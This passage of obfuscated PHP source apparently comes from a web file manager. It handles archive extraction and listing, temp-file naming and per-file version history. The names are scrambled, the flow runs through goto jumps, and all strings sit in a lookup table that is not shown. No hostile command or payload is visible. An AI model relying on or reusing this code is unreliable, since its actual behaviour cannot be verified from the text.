get_path_father($FÍí‘¼àØ [$f¹³ÉÏÌ[75]]); if (!$FœèïŠ™‰ä && $dÜÌĞ³â½->getType() == $f¹³ÉÏÌ[102]) { $b×ÂÈ…É»ª = get_path_father($dÜÌĞ³â½->path); } $F”ÃºÔÌŞ¬ = IO::info($b×ÂÈ…É»ª); if (!$F”ÃºÔÌŞ¬[$f¹³ÉÏÌ[192]]) { show_json(LNG($f¹³ÉÏÌ[1040]), !1); } } goto díàÇïÛ†; f˜êÉßÅÍõ: if (!$f‹´ÆÃİ†) { del_dir($F½ğ‘£ÕÑ’); show_json(LNG($f¹³ÉÏÌ[1041]), !1); } del_dir($F½ğ‘£ÕÑ’); return $f‹´ÆÃİ†; goto E±É‚™¥¶±; díàÇïÛ†: $Eò„²™¼Ø = $b×ÂÈ…É»ª . $B¡Ø‰ø›ô . $f¹³ÉÏÌ[91] . $BÙ°«¤Èğˆ; $Eò„²™¼Ø = get_filename_auto($Eò„²™¼Ø, $f¹³ÉÏÌ[33], $Bäˆôˆİ†Œ); $DóÅ¶Â°ƒè = self::iconvSystem($Eò„²™¼Ø); goto Fæùğ‰çÅÑ; E±É‚™¥¶±: } public static function unzip($B»„»¼™ÉØ, $BÈÄ……í°´ = "\x72\x65\x70\154\141\x63\x65") { goto bõ¯»ƒŞ¸Ø; C¾Æ®Óõ½: foreach ($aãù æ‹È‘ as $EŠ‚ˆˆôë) { $EŠ‚ˆˆôë = self::iconvApp($EŠ‚ˆˆôë); self::move($EŠ‚ˆˆôë, $AÙÚÁÚÂ·, $BÈÄ……í°´); } del_dir($D¶Ÿ‚Ãƒé); if (!$D½…µ¬‰¶) { del_file($FßÊÍï„‘’); } goto F¹ßÓ©á›¯; bõ¯»ƒŞ¸Ø: $D†³ƒÅŞ ğ =& $_SERVER[úÎü]; $BŞª¬£Ëæ = $B»„»¼™ÉØ[$D†³ƒÅŞ ğ[75]]; $AÙÚÁÚÂ· = $B»„»¼™ÉØ[$D†³ƒÅŞ ğ[1042]]; goto F™ˆ–ù„…ä; D¡ÛíÔö„ß: Hook::trigger($D†³ƒÅŞ ğ[1049], $D¶Ÿ‚Ãƒé); recursion_dir($D¶Ÿ‚Ãƒé, $c„ù§…÷Šİ, $Dø‰»ÚÎ‡¼, 0); $aãù æ‹È‘ = array_merge($c„ù§…÷Šİ, $Dø‰»ÚÎ‡¼); goto C¾Æ®Óõ½; E®¼ˆö«½: if (!@file_exists(self::iconvSystem($FßÊÍï„‘’))) { $D½…µ¬‰¶ = self::localFilePath($BŞª¬£Ëæ, $E–©ø×ß¸ğ); $FßÊÍï„‘’ = $D½…µ¬‰¶ ? $D½…µ¬‰¶ : parent::download($BŞª¬£Ëæ, $FßÊÍï„‘’); } $FßÊÍï„‘’ = self::iconvSystem($FßÊÍï„‘’); $AóËã³‰ÊŞ = isset($B»„»¼™ÉØ[$D†³ƒÅŞ ğ[1044]]) ? $B»„»¼™ÉØ[$D†³ƒÅŞ ğ[1044]] : $D†³ƒÅŞ ğ[1045]; goto dÖö¦„‡Œ; F¹ßÓ©á›¯: return !0; goto Bé´³œ›’Š; BêŒï¦¤º: $a÷õĞñ²±¹ = self::tmpFileName($D£‡ƒŸí†Ğ); $D¶Ÿ‚Ãƒé = TEMP_FILES . $a÷õĞñ²±¹; del_dir($D¶Ÿ‚Ãƒé); goto fÄí›éë‹ï; fÄí›éë‹ï: mk_dir($D¶Ÿ‚Ãƒé); $E–©ø×ß¸ğ = self::fileExt($D£‡ƒŸí†Ğ); $FßÊÍï„‘’ = $D¶Ÿ‚Ãƒé . $D†³ƒÅŞ ğ[91] . $E–©ø×ß¸ğ; goto E®¼ˆö«½; F™ˆ–ù„…ä: if (!($D£‡ƒŸí†Ğ = parent::info($BŞª¬£Ëæ))) { show_json(LNG($D†³ƒÅŞ ğ[1043]), !1); } if (!($C¿Åâ¹òáÕ = parent::infoFull($AÙÚÁÚÂ·))) { $AÙÚÁÚÂ· = parent::mkdir($AÙÚÁÚÂ·); $C¿Åâ¹òáÕ = array($D†³ƒÅŞ ğ[75] => $AÙÚÁÚÂ·); } else { if (isset($C¿Åâ¹òáÕ[$D†³ƒÅŞ ğ[385]]) && trim($C¿Åâ¹òáÕ[$D†³ƒÅŞ ğ[75]], $D†³ƒÅŞ ğ[8]) != trim($AÙÚÁÚÂ·, $D†³ƒÅŞ ğ[8])) { $cÚÊç†ˆ¬í = KodIO::make($C¿Åâ¹òáÕ[$D†³ƒÅŞ ğ[478]]); $CÔ­í‘³¤É = parent::fileNameAuto($cÚÊç†ˆ¬í, $C¿Åâ¹òáÕ[$D†³ƒÅŞ ğ[28]], REPEAT_RENAME_FOLDER, !0); $AÙÚÁÚÂ· = parent::mkdir($cÚÊç†ˆ¬í . $CÔ­í‘³¤É); $C¿Åâ¹òáÕ = array($D†³ƒÅŞ ğ[75] => $AÙÚÁÚÂ·); } } $AÙÚÁÚÂ· = $C¿Åâ¹òáÕ[$D†³ƒÅŞ ğ[75]]; goto BêŒï¦¤º; dÖö¦„‡Œ: $C£ä„¶™‹… = KodArchive::extract($FßÊÍï„‘’, $D¶Ÿ‚Ãƒé . $D†³ƒÅŞ ğ[8], $AóËã³‰ÊŞ); self::archiveExt(); if (!$C£ä„¶™‹…[$D†³ƒÅŞ ğ[1046]]) { show_json($D†³ƒÅŞ ğ[1047] . $C£ä„¶™‹…[$D†³ƒÅŞ ğ[1048]], !1); } goto D¡ÛíÔö„ß; Bé´³œ›’Š: } public static function unzipList($Dçñµ ÊÇ) { goto b•‰ó¨ƒİ„; fÛÒİºõ…: return $F¤ƒ¸…¶âÕ[$BÃË²ÙÒ¤±[1048]]; goto F¯è¾ëºŞ; FŒäÍÅºì: self::archiveExt(); del_dir($DòŸì¾õÙœ); if (!$F¤ƒ¸…¶âÕ[$BÃË²ÙÒ¤±[1046]]) { show_json($F¤ƒ¸…¶âÕ[$BÃË²ÙÒ¤±[1048]], !1); } goto D„±ÅÛÏ²’; AÃº§‘ô§ç: $C¬Ï°‘è„Ö = self::iconvSystem($C¬Ï°‘è„Ö); if ($eôÅ½êº >= 0) { $CŞÏ¨¶•ºå = isset($Dçñµ ÊÇ[$BÃË²ÙÒ¤±[1054]]) ? $Dçñµ ÊÇ[$BÃË²ÙÒ¤±[1054]] : !1; $a¤ğ†ãĞšË = isset($Dçñµ ÊÇ[$BÃË²ÙÒ¤±[28]]) ? $Dçñµ ÊÇ[$BÃË²ÙÒ¤±[28]] : $BÃË²ÙÒ¤±[33]; KodArchive::filePreview($C¬Ï°‘è„Ö, $eôÅ½êº, $CŞÏ¨¶•ºå, $a¤ğ†ãĞšË); self::archiveExt(); die; } $F¤ƒ¸…¶âÕ = KodArchive::listContent($C¬Ï°‘è„Ö); goto FŒäÍÅºì; D„±ÅÛÏ²’: $D­¢Ñ°“ŠÕ = json_encode($F¤ƒ¸…¶âÕ[$BÃË²ÙÒ¤±[1048]]); self::setContent($DğÒ¶Ê—ëÊ, $D­¢Ñ°“ŠÕ); if (count($F¤ƒ¸…¶âÕ[$BÃË²ÙÒ¤±[1048]]) >= $a±¥öùò) { show_json(sprintf(LNG($BÃË²ÙÒ¤±[1052]), count($F¤ƒ¸…¶âÕ[$BÃË²ÙÒ¤±[1048]])), !1); } goto fÛÒİºõ…; Eöªô£†•: $Cë°ßÔñ = self::info($C‰·£Çäø); $E¡Êß±ö»’ = self::fileExt($Cë°ßÔñ); $c¶¼Æ¾Â¤ = self::tmpFileName($Cë°ßÔñ); goto AÃ¨‚’åÁ…; dçÚ ×‡ßÌ: if (!is_dir($DòŸì¾õÙœ)) { mk_dir($DòŸì¾õÙœ); } $C¬Ï°‘è„Ö = $DòŸì¾õÙœ . $BÃË²ÙÒ¤±[8] . $Cã¹Á¬ÛÚ; if (!@file_exists(self::iconvSystem($C¬Ï°‘è„Ö))) { if (isset($D–Ë¢éÜğ)) { url_request($Cœ”ŒÂˆäå, $BÃË²ÙÒ¤±[1053], $C¬Ï°‘è„Ö); } else { $DÆÚÚÑ¸ß = self::localFilePath($Cœ”ŒÂˆäå, $E¡Êß±ö»’); $C¬Ï°‘è„Ö = $DÆÚÚÑ¸ß ? $DÆÚÚÑ¸ß : self::download($Cœ”ŒÂˆäå, $C¬Ï°‘è„Ö); } } goto AÃº§‘ô§ç; fØñ¦‹ØÌ°: $a±¥öùò = 50000; if (request_url_safe($Cœ”ŒÂˆäå)) { $D–Ë¢éÜğ = parse_url_query($Cœ”ŒÂˆäå); if (!isset($D–Ë¢éÜğ[$BÃË²ÙÒ¤±[75]])) { show_json($BÃË²ÙÒ¤±[1051], !1); } } $C‰·£Çäø = isset($D–Ë¢éÜğ) ? $D–Ë¢éÜğ[$BÃË²ÙÒ¤±[75]] : $Cœ”ŒÂˆäå; goto Eöªô£†•; b•‰ó¨ƒİ„: $BÃË²ÙÒ¤± =& $_SERVER[úÎü]; $Cœ”ŒÂˆäå = $Dçñµ ÊÇ[$BÃË²ÙÒ¤±[75]]; $eôÅ½êº = isset($Dçñµ ÊÇ[$BÃË²ÙÒ¤±[1050]]) ? $Dçñµ ÊÇ[$BÃË²ÙÒ¤±[1050]] : -1; goto fØñ¦‹ØÌ°; AÃ¨‚’åÁ…: if (isset($D–Ë¢éÜğ)) { $cé’Ì âªÈ = array($D–Ë¢éÜğ[$BÃË²ÙÒ¤±[75]], $D–Ë¢éÜğ[$BÃË²ÙÒ¤±[1050]], $D–Ë¢éÜğ[$BÃË²ÙÒ¤±[28]]); $Cã¹Á¬ÛÚ = md5(implode($BÃË²ÙÒ¤±[70], $cé’Ì âªÈ)) . $BÃË²ÙÒ¤±[91] . get_path_ext($D–Ë¢éÜğ[$BÃË²ÙÒ¤±[28]]); } else { $cé’Ì âªÈ = array($Cë°ßÔñ[$BÃË²ÙÒ¤±[28]], $Cë°ßÔñ[$BÃË²ÙÒ¤±[75]], $Cë°ßÔñ[$BÃË²ÙÒ¤±[77]]); $Cã¹Á¬ÛÚ = md5(implode($BÃË²ÙÒ¤±[70], $cé’Ì âªÈ)) . $BÃË²ÙÒ¤±[91] . $E¡Êß±ö»’; } if ($eôÅ½êº == -1) { $DğÒ¶Ê—ëÊ = IO_PATH_SYSTEM_TEMP . "\x7a\x69\160\x56\151\145\x77\x2f{$c¶¼Æ¾Â¤}\57{$Cã¹Á¬ÛÚ}\56\x6c\x6f\147"; $eÄä¹Œ‡é = self::infoFull($DğÒ¶Ê—ëÊ); if ($eÄä¹Œ‡é) { $DğÒ¶Ê—ëÊ = $eÄä¹Œ‡é[$BÃË²ÙÒ¤±[75]]; $Aİäƒò®ÓŠ = self::getContent($DğÒ¶Ê—ëÊ); if ($Aİäƒò®ÓŠ) { $D­¢Ñ°“ŠÕ = json_decode($Aİäƒò®ÓŠ, !0); if (count($D­¢Ñ°“ŠÕ) >= $a±¥öùò) { show_json(sprintf(LNG($BÃË²ÙÒ¤±[1052]), count($D­¢Ñ°“ŠÕ)), !1); } return $D­¢Ñ°“ŠÕ; } } else { $DğÒ¶Ê—ëÊ = self::mkfile($DğÒ¶Ê—ëÊ); } } $DòŸì¾õÙœ = TEMP_FILES . $c¶¼Æ¾Â¤; goto dçÚ ×‡ßÌ; F¯è¾ëºŞ: } private static function fileExt($e¤‹ÅÈæä) { $AìŞÀ³Ú•Ç =& $_SERVER[úÎü]; $AÎ×îĞÃ = $e¤‹ÅÈæä[$AìŞÀ³Ú•Ç[165]]; if ($AÎ×îĞÃ == $AìŞÀ³Ú•Ç[1055]) { $FÆŸ¥­Öäß = $AìŞÀ³Ú•Ç[1056]; if (substr($e¤‹ÅÈæä[$AìŞÀ³Ú•Ç[28]], -strlen($FÆŸ¥­Öäß)) == $FÆŸ¥­Öäß) { $AÎ×îĞÃ = $AìŞÀ³Ú•Ç[1057]; } } self::archiveExt($AÎ×îĞÃ); return $AÎ×îĞÃ; } private static function zipFileList($b«Ü¥ÛŒÅ†, $AÏŠ¬–‡•ò = false) { $få•İÒìƒÎ =& $_SERVER[úÎü]; $cìÔÈÎ¸ì± = array(); foreach ($b«Ü¥ÛŒÅ† as $cÀÚÎ‘ˆ…Ñ) { $EÄ—²ù²¦ = $cÀÚÎ‘ˆ…Ñ[$få•İÒìƒÎ[75]]; if ($AÏŠ¬–‡•ò) { $EÄ—²ù²¦ = self::copy($cÀÚÎ‘ˆ…Ñ[$få•İÒìƒÎ[75]], $AÏŠ¬–‡•ò, $få•İÒìƒÎ[745]); } else { $cØäÍŸ…á = self::init($cÀÚÎ‘ˆ…Ñ[$få•İÒìƒÎ[75]]); if ($cØäÍŸ…á->getType() == $få•İÒìƒÎ[102]) { $EÄ—²ù²¦ = $cØäÍŸ…á->path; } } if ($EÄ—²ù²¦ && self::local()->exist($EÄ—²ù²¦)) { $cìÔÈÎ¸ì±[$cÀÚÎ‘ˆ…Ñ[$få•İÒìƒÎ[75]]] = $EÄ—²ù²¦; } } if (!empty($cìÔÈÎ¸ì±)) { return array_values($cìÔÈÎ¸ì±); } show_json(LNG($få•İÒìƒÎ[1021]), !1); } public static function tmpFileName($eÒ”‡ÓµßĞ) { $bÊšô·—äñ =& $_SERVER[úÎü]; $a·ğˆÑ› = array($eÒ”‡ÓµßĞ[$bÊšô·—äñ[28]], $eÒ”‡ÓµßĞ[$bÊšô·—äñ[75]], $eÒ”‡ÓµßĞ[$bÊšô·—äñ[77]], $eÒ”‡ÓµßĞ[$bÊšô·—äñ[476]]); return md5(implode($bÊšô·—äñ[70], $a·ğˆÑ›)); } private static function localFilePath($cÎö’ŸÇÂ’, $Cùø‚ïÉÏÆ) { goto d±Šåê÷‘…; ešª›õ˜ã§: if ($cƒÔøïĞ“Â == $FÅØ‘¾´éÙ[102] || $cƒÔøïĞ“Â == $FÅØ‘¾´éÙ[1061]) { if (!$c·Éˆ¡õ->exist($c·Éˆ¡õ->path)) { show_json(LNG($FÅØ‘¾´éÙ[101]), !1); } return $c·Éˆ¡õ->path; } return !1; goto bÚ¶ÍÏ¼¼Ø; d±Šåê÷‘…: $FÅØ‘¾´éÙ =& $_SERVER[úÎü]; if ($Cùø‚ïÉÏÆ == $FÅØ‘¾´éÙ[1058] && strtoupper(substr(PHP_OS, 0, 3)) == $FÅØ‘¾´éÙ[1059]) { return !1; } $A†¶©ÄŒ‘Á = KodIO::parse($cÎö’ŸÇÂ’); goto E õ­Í»äà; E õ­Í»äà: if ($A†¶©ÄŒ‘Á[$FÅØ‘¾´éÙ[29]] == KodIO::KOD_SOURCE) { $e†«Øº¥Ú = Model($FÅØ‘¾´éÙ[752])->fileInfoGet(KodIO::sourceID($cÎö’ŸÇÂ’)); if (!$e†«Øº¥Ú[$FÅØ‘¾´éÙ[75]]) { show_json($FÅØ‘¾´éÙ[1060], !1); } $cÎö’ŸÇÂ’ = $e†«Øº¥Ú[$FÅØ‘¾´éÙ[75]]; } $c·Éˆ¡õ = self::init($cÎö’ŸÇÂ’); $cƒÔøïĞ“Â = $c·Éˆ¡õ->getType(); goto ešª›õ˜ã§; bÚ¶ÍÏ¼¼Ø: } private static function archiveExt($fä‹††§‚‘ = '') { $GLOBALS[$_SERVER[úÎü][1062]] = $fä‹††§‚‘; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { goto bÍíÕ‡‘·³; bÍíÕ‡‘·³: $Bõ„²©×á =& $_SERVER[úÎü]; $eÔÑĞÖªà = $GLOBALS[$Bõ„²©×á[6]][$Bõ„²©×á[84]][$Bõ„²©×á[1063]]; if ($eÔÑĞÖªà <= 0) { return; } goto C©…ÆÈÇ‘Ê; F—±ˆ¦ğã: Hook::bind($Bõ„²©×á[1070], $Bõ„²©×á[1071]); Hook::bind($Bõ„²©×á[1072], $Bõ„²©×á[1073]); Hook::bind($Bõ„²©×á[1074], $Bõ„²©×á[1075]); goto ağ¹‰ŠÁéã; C©…ÆÈÇ‘Ê: Hook::bind($Bõ„²©×á[1064], $Bõ„²©×á[1065]); Hook::bind($Bõ„²©×á[1066], $Bõ„²©×á[1067]); Hook::bind($Bõ„²©×á[1068], $Bõ„²©×á[1069]); goto F—±ˆ¦ğã; ağ¹‰ŠÁéã: } public static function eventBeforeUpload($c‚Ã®«µŠ–) { if ($c‚Ã®«µŠ–[3] && $c‚Ã®«µŠ–[3] != REPEAT_REPLACE) { return; } $aĞÜ¯¿§ = self::parsePath($c‚Ã®«µŠ–[0]); if (!$aĞÜ¯¿§) { return; } self::add($aĞÜ¯¿§); } public static function eventBeforeEdit($CåöÖìĞâ) { $BùôäÎ¯ãÏ = self::parsePath($CåöÖìĞâ[0]); if (!$BùôäÎ¯ãÏ) { return; } self::add($BùôäÎ¯ãÏ); } public static function eventBeforeCopyFile($c„Ò»Õ³Ä¼, $c¯¿­ÎĞ“¤, $Dè­¼°ã®, $aÈé†êÛ´Û, $e¾ªã×âÒ”, $E³¥…„Ï²Ğ) { $Bİ÷å§ÍÙ = $Dè­¼°ã®->getPathOuter($aÈé†êÛ´Û); $C–™ĞÆéÙ„ = self::parsePath($Bİ÷å§ÍÙ); if (!$C–™ĞÆéÙ„) { return; } self::add($C–™ĞÆéÙ„); } public static function eventBeforeRename($f ’ØÈÌŠ) { $dåƒì Ÿïò =& $_SERVER[úÎü]; $E„é™Ô™§Â = self::parsePath($f ’ØÈÌŠ[0]); if (!$E„é™Ô™§Â) { return; } $e÷ˆä‘„¶¤ = self::checkInHistory($E„é™Ô™§Â); if (!$e÷ˆä‘„¶¤) { return; } if ($e÷ˆä‘„¶¤[$dåƒì Ÿïò[29]] == $dåƒì Ÿïò[171]) { $C…é˜•¶ùš = self::listData($E„é™Ô™§Â); if ($C…é˜•¶ùš && $C…é˜•¶ùš[$dåƒì Ÿïò[361]]) { self::moveHistory($E„é™Ô™§Â, $f ’ØÈÌŠ[1]); } } else { IO::rename($e÷ˆä‘„¶¤[$dåƒì Ÿïò[75]], $f ’ØÈÌŠ[1]); } } public static function eventBeforeMove($a‡’¿‚ë¤µ) { goto aìª„ƒˆ¼Á; AÀ ÏœìŠ£: $a­¨³ù®µ¤ = self::parsePath($a‡’¿‚ë¤µ[1]); if (!$a­¨³ù®µ¤) { return; } $Dí³£â§ïï = $a‡’¿‚ë¤µ[3]; goto cÁ¿ö°ÃÙÒ; cÁ¿ö°ÃÙÒ: $DÁÓ°½° = self::checkInHistory($CØäÙ¸ÑÁ); if (!$DÁÓ°½°) { return; } $DøôÀÈ‡éÖ = self::pathHistory($a­¨³ù®µ¤); goto B¨İƒƒíÍš; B¨İƒƒíÍš: if ($DÁÓ°½°[$a„¦ë™²Å[29]] == $a„¦ë™²Å[171]) { $D±Ò´â­›‹ = self::listData($CØäÙ¸ÑÁ); $c—ïª«éãƒ = rtrim($a­¨³ù®µ¤, $a„¦ë™²Å[8]) . $a„¦ë™²Å[8] . ($Dí³£â§ïï ? $Dí³£â§ïï : get_path_this($CØäÙ¸ÑÁ)); $dî‰å‡  = self::listData($c—ïª«éãƒ); if ($D±Ò´â­›‹ && $D±Ò´â­›‹[$a„¦ë™²Å[361]] && $dî‰å‡  && $dî‰å‡ [$a„¦ë™²Å[361]]) { return self::clear($CØäÙ¸ÑÁ); } if ($D±Ò´â­›‹ && $D±Ò´â­›‹[$a„¦ë™²Å[361]]) { self::moveHistory($CØäÙ¸ÑÁ, $Dí³£â§ïï, $DøôÀÈ‡éÖ); } } else { IO::move($DÁÓ°½°[$a„¦ë™²Å[75]], $DøôÀÈ‡éÖ, !1, $Dí³£â§ïï); self::clearEmptyFolder(IO::pathFather($DÁÓ°½°[$a„¦ë™²Å[75]])); } goto D¥‰‡†òñÅ; aìª„ƒˆ¼Á: $a„¦ë™²Å =& $_SERVER[úÎü]; $CØäÙ¸ÑÁ = self::parsePath($a‡’¿‚ë¤µ[0]); if (!$CØäÙ¸ÑÁ) { return; } goto AÀ ÏœìŠ£; D¥‰‡†òñÅ: } public static function eventAfterRemove($dóÊ²Âµ™å, $céÈÃ—˜µ¹) { goto Eª¹™”‘á; Eª¹™”‘á: $BŠ¼¡’ã¥¶ =& $_SERVER[úÎü]; if (!$céÈÃ—˜µ¹) { return; } $dİï£ùšÅ³ = self::parsePath($dóÊ²Âµ™å[0]); goto FÖÛÊô¶½¯; FÖÛÊô¶½¯: if (!$dİï£ùšÅ³) { return; } $A®ãìêšºğ = self::checkInHistory($dİï£ùšÅ³); if (!$A®ãìêšºğ) { return; } goto cĞßğéòÂ»; cĞßğéòÂ»: if ($A®ãìêšºğ[$BŠ¼¡’ã¥¶[29]] == $BŠ¼¡’ã¥¶[171]) { $dà¨ÌÑ¬´ = self::listData($dİï£ùšÅ³, !1); if ($dà¨ÌÑ¬´ && $dà¨ÌÑ¬´[$BŠ¼¡’ã¥¶[361]]) { self::clear($dİï£ùšÅ³, !1); } } else { IO::remove($A®ãìêšºğ[$BŠ¼¡’ã¥¶[75]]); self::clearEmptyFolder(IO::pathFather($A®ãìêšºğ[$BŠ¼¡’ã¥¶[75]])); } goto fÄ¦ãšîÛ‘; fÄ¦ãšîÛ‘: } private static function checkInHistory($A­™¼éœº) { $BÜ­³ò—Ÿ¦ = self::pathHistory($A­™¼éœº); if (!IO::exist($BÜ­³ò—Ÿ¦)) { $BÜ­³ò—Ÿ¦ .= $_SERVER[úÎü][1076]; } return IO::exist($BÜ­³ò—Ÿ¦) ? IO::info($BÜ­³ò—Ÿ¦) : !1; } private static function parsePath($dƒ†äã‚™‰) { goto Aëï± ŒÄì; Aëï± ŒÄì: $C”±©ãÏÊ =& $_SERVER[úÎü]; if (!$dƒ†äã‚™‰) { return !1; } if ($GLOBALS[$C”±©ãÏÊ[1077]]) { return; } goto DíòÜ¹å“; DíòÜ¹å“: $eÊ¢«¾µŠÁ = KodIO::parse($dƒ†äã‚™‰); $f¤ƒ“öçÖ = $eÊ¢«¾µŠÁ[$C”±©ãÏÊ[29]]; $A‘îÈ³ìĞä = !$f¤ƒ“öçÖ || $f¤ƒ“öçÖ == KodIO::KOD_IO || $f¤ƒ“öçÖ == KodIO::KOD_SHARE_ITEM; goto f«êŸ… ïá; f«êŸ… ïá: if (!$A‘îÈ³ìĞä || !$eÊ¢«¾µŠÁ[$C”±©ãÏÊ[1078]]) { return !1; } if ($f¤ƒ“öçÖ == KodIO::KOD_SHARE_ITEM) { $bÃŒêâî® = IO::init($dƒ†äã‚™‰); if ($bÃŒêâî®->pathParse[$C”±©ãÏÊ[1008]]) { return self::parsePath($bÃŒêâî®->pathParse[$C”±©ãÏÊ[1008]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto bö›Ò÷Ã; bö›Ò÷Ã: $B˜‹·ö÷‰ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $C”±©ãÏÊ[1079]); foreach ($B˜‹·ö÷‰ as $a•Œ§Ú£œÖ) { if (!$f¤ƒ“öçÖ && substr($dƒ†äã‚™‰, 0, strlen($a•Œ§Ú£œÖ)) == $a•Œ§Ú£œÖ) { return !1; } } self::log($GLOBALS[$C”±©ãÏÊ[1003]] . $C”±©ãÏÊ[1080] . $dƒ†äã‚™‰); goto D­ÜÅõÂ©¤; D­ÜÅõÂ©¤: return $dƒ†äã‚™‰; goto E‚öŞµ«Ê«; E‚öŞµ«Ê«: } private static function pathHistory($F·ÚíÚ¼Ë¦) { $cƒİïÍÔ’ =& $_SERVER[úÎü]; $BĞøîÑ–Ûò = self::$_historyBase . ltrim(KodIO::clear($F·ÚíÚ¼Ë¦), $cƒİïÍÔ’[8]); $BĞøîÑ–Ûò = str_replace(array($cƒİïÍÔ’[1081]), array($cƒİïÍÔ’[1082]), $BĞøîÑ–Ûò); return $BĞøîÑ–Ûò; } public static function log($A¿‹«ÒíÛÔ) { } public static function historyCount($bç´œˆóŒ›) { $CÖ­ªî’”È =& $_SERVER[úÎü]; $c‘÷‚ä‡¢ = array(); $FÅøéôã´å = array(); foreach ($bç´œˆóŒ› as $a×œ¾³Æ×Š) { $A±Ú•øØèÓ = get_path_father($a×œ¾³Æ×Š); if (!$FÅøéôã´å[$A±Ú•øØèÓ]) { $FÅøéôã´å[$A±Ú•øØèÓ] = array(); } $FÅøéôã´å[$A±Ú•øØèÓ][] = get_path_this($a×œ¾³Æ×Š); } foreach ($FÅøéôã´å as $A±Ú•øØèÓ => $FøË¤ŒÕÆ) { $e–ÂĞå¬â = self::parsePath($A±Ú•øØèÓ); if (!$e–ÂĞå¬â) { continue; } foreach ($FøË¤ŒÕÆ as $déÀŠÂÁĞŒ) { $dŒìæ¦‘ˆ® = self::listData(rtrim($e–ÂĞå¬â, $CÖ­ªî’”È[8]) . $CÖ­ªî’”È[8] . $déÀŠÂÁĞŒ, !1); if ($dŒìæ¦‘ˆ® && $dŒìæ¦‘ˆ®[$CÖ­ªî’”È[361]]) { $c‘÷‚ä‡¢[rtrim($A±Ú•øØèÓ, $CÖ­ªî’”È[8]) . $CÖ­ªî’”È[8] . $déÀŠÂÁĞŒ] = count($dŒìæ¦‘ˆ®[$CÖ­ªî’”È[361]]); } } } return $c‘÷‚ä‡¢; } public static function add($a—È…Ö«±) { goto C‚Ñ’¨‚‹ä; Fˆø“•™ˆ°: return self::saveData($cÓˆ’•°¬[$D¨§¼Şã¢ã[1089]], $C°Í¹•¸¹Ç); goto fåôÈñ±ğ¬; b…î‹º¬™Û: $B´êÎß«É = Model($D¨§¼Şã¢ã[1083])->get($D¨§¼Şã¢ã[1084]); $eó±í„Ìİ = $GLOBALS[$D¨§¼Şã¢ã[6]][$D¨§¼Şã¢ã[84]][$D¨§¼Şã¢ã[1063]]; $e §¯Õ»¹© = $B´êÎß«É == $D¨§¼Şã¢ã[1085] ? 5 : $eó±í„Ìİ; goto b‚æÕØàšã; b‚æÕØàšã: if ($eó±í„Ìİ <= 0) { return; } $dšÅé•…¶ = IO::hashSimple($a—È…Ö«±); $Aù”ç°÷„È = IO::info($a—È…Ö«±); goto EêÑ––áÀ¶; Bä¹÷ê¢ÉÉ: if ($C°Í¹•¸¹Ç && $C°Í¹•¸¹Ç[0][$D¨§¼Şã¢ã[168]] == $dšÅé•…¶) { return !0; } if (array_key_exists($D¨§¼Şã¢ã[192], $Aù”ç°÷„È) && !$Aù”ç°÷„È[$D¨§¼Şã¢ã[192]]) { return !1; } $FÌ³ñ¯»Ô« = short_id(time()); goto E¡›‹„½¹; C‚Ñ’¨‚‹ä: $D¨§¼Şã¢ã =& $_SERVER[úÎü]; $cÓˆ’•°¬ = self::listData($a—È…Ö«±); if (!$cÓˆ’•°¬) { return; } goto b…î‹º¬™Û; FìµµÓ´ù´: if (!$c‰ºÑòöá“) { self::clearEmptyFolder($cÓˆ’•°¬[$D¨§¼Şã¢ã[1088]]); return !1; } array_unshift($C°Í¹•¸¹Ç, $cÎÈŞ¥ßˆ); if (count($C°Í¹•¸¹Ç) > $e §¯Õ»¹©) { $EçÇ×‡ª‘ = array_slice($C°Í¹•¸¹Ç, $e §¯Õ»¹©); foreach ($EçÇ×‡ª‘ as $eëé°‘ƒª) { IO::remove($cÓˆ’•°¬[$D¨§¼Şã¢ã[1088]] . $eëé°‘ƒª[$D¨§¼Şã¢ã[28]]); } $C°Í¹•¸¹Ç = array_slice($C°Í¹•¸¹Ç, 0, $e §¯Õ»¹©); } goto Fˆø“•™ˆ°; EêÑ––áÀ¶: $C°Í¹•¸¹Ç = $cÓˆ’•°¬[$D¨§¼Şã¢ã[361]]; if ($Aù”ç°÷„È[$D¨§¼Şã¢ã[77]] == 0) { return; } if ($Aù”ç°÷„È[$D¨§¼Şã¢ã[77]] >= 1024 * 1024 * 500) { return !1; } goto Bä¹÷ê¢ÉÉ; E¡›‹„½¹: $cÎÈŞ¥ßˆ = array($D¨§¼Şã¢ã[383] => $FÌ³ñ¯»Ô«, $D¨§¼Şã¢ã[168] => $dšÅé•…¶, $D¨§¼Şã¢ã[28] => $Aù”ç°÷„È[$D¨§¼Şã¢ã[28]] . $D¨§¼Şã¢ã[91] . date($D¨§¼Şã¢ã[1086]) . rand_string(1), $D¨§¼Şã¢ã[77] => $Aù”ç°÷„È[$D¨§¼Şã¢ã[77]], $D¨§¼Şã¢ã[394] => USER_ID, $D¨§¼Şã¢ã[190] => time(), $D¨§¼Şã¢ã[1087] => $D¨§¼Şã¢ã[33]); IO::mkdir($cÓˆ’•°¬[$D¨§¼Şã¢ã[1088]]); $c‰ºÑòöá“ = IO::copy($a—È…Ö«±, $cÓˆ’•°¬[$D¨§¼Şã¢ã[1088]], !1, $cÎÈŞ¥ßˆ[$D¨§¼Şã¢ã[28]]); goto FìµµÓ´ù´; fåôÈñ±ğ¬: } public static function remove($C½§ò˜„³˜, $F´£ãôáª) { $fÃ‚—èİß‡ =& $_SERVER[úÎü]; $BöÙ§Šàæ— = self::listData($C½§ò˜„³˜); $bº®´¹ê¾ˆ = array(); if (!$BöÙ§Šàæ—) { return !1; } foreach ($BöÙ§Šàæ—[$fÃ‚—èİß‡[361]] as $D¹–Êâ‹±ª) { if ($D¹–Êâ‹±ª[$fÃ‚—èİß‡[383]] == $F´£ãôáª) { IO::remove($BöÙ§Šàæ—[$fÃ‚—èİß‡[1088]] . $D¹–Êâ‹±ª[$fÃ‚—èİß‡[28]]); continue; } $bº®´¹ê¾ˆ[] = $D¹–Êâ‹±ª; } return self::saveData($BöÙ§Šàæ—[$fÃ‚—èİß‡[1089]], $bº®´¹ê¾ˆ); } public static function clear($bè¥›•ÈÖƒ, $CîÒ¨öÈ = true) { $f” š†“² =& $_SERVER[úÎü]; $cÚª·›ä· = self::listData($bè¥›•ÈÖƒ, $CîÒ¨öÈ); if (!$cÚª·›ä·) { return !1; } foreach ($cÚª·›ä·[$f” š†“²[361]] as $b¾İš„øŒ×) { IO::remove($cÚª·›ä·[$f” š†“²[1088]] . $b¾İš„øŒ×[$f” š†“²[28]]); } 